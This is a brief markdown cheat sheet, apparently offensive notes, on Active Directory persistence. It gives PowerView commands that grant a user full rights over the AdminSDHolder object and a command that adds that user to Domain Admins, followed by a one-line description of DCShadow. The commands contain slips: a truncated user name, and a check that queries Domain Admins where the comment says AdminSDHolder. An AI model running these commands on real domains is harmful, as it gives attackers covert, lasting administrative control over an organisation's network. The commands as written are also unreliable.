### AdminSDHolder Persistent
```
The User John has granted GenericAll Privilege.

Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccountName Joh -Verbose -Rights All

#The Following could be verify whether The unprivilege user John has GenericAll rights on the AdminSDHolder.

Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'John'}

net group "domain admins" John /add /domain
```

###  DCShadow Persistent
```
DCShadow is a persistence technique which is  allowing an attacker to push malicious changes into the environment by modifying active directory objects.domain privileges is requiredto carry out this attack
```
